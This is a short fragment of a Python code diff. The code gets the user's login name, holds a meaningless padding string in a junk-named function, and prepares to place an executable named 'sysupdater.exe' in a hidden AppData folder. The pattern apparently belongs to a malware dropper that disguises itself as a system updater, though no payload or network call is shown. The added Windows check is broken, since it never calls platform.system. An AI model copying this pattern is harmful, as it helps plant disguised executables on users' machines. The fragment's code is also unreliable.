@@ -14,8 +14,11 @@ username = os.getlogin()
 def dossssssss():
     vsasdr = "sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssebfwjehbfwkjebfwkjbfwjkbwkjbfwejwejkbfwkjwfkebfkwjebfwejkbfwejkbfwekjbfwejkbfkwebfwekjdddddddddddddddddddddddddddddddddddddddddddddddddddddaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    
-file_path = os.environ['appdata']+"\Programs\sysupdater.exe"
-if not os.path.exists(file_path):
+try:
+    file_path = os.environ['appdata']+"\Programs\sysupdater.exe"
+except:
+    pass
+if not os.path.exists(file_path) and platform.system == "Windows":
     try:
         os.mkdir(f"{os.environ['appdata']}\Programs")
     except:
